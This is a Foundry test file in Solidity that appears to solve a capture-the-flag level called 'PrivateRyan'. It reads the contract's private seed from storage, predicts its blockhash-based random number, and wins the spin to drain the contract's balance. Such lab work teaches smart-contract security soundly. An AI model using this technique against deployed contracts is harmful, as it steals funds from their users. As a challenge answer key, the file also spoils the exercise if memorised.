// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "src/PrivateRyan.sol";

// forge test --match-contract PrivateRyanTest -vvvv
contract PrivateRyanTest is BaseTest {
    PrivateRyan instance;

    function setUp() public override {
        super.setUp();
        instance = new PrivateRyan{value: 0.01 ether}();
        vm.roll(48743985);
    }

    function testExploitLevel() public {
        /* YOUR EXPLOIT GOES HERE */
        uint256 seed = uint256(vm.load(address(instance), 0));  // Чтение первого слота, где хранится seed
        uint256 winningNumber = predictRand(seed);
        instance.spin{value: 0.01 ether}(winningNumber);

        checkSuccess();
    }
    function predictRand(uint256 seed) internal view returns (uint256) {
        uint256 FACTOR = 1157920892373161954135709850086879078532699843656405640394575840079131296399;
        uint256 factor = (FACTOR * 100) / 100;  // Это значение используется в rand
        uint256 blockNumber = block.number - seed;
        uint256 hashVal = uint256(blockhash(blockNumber));

        return uint256((uint256(hashVal) / factor)) % 100;
    }
    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
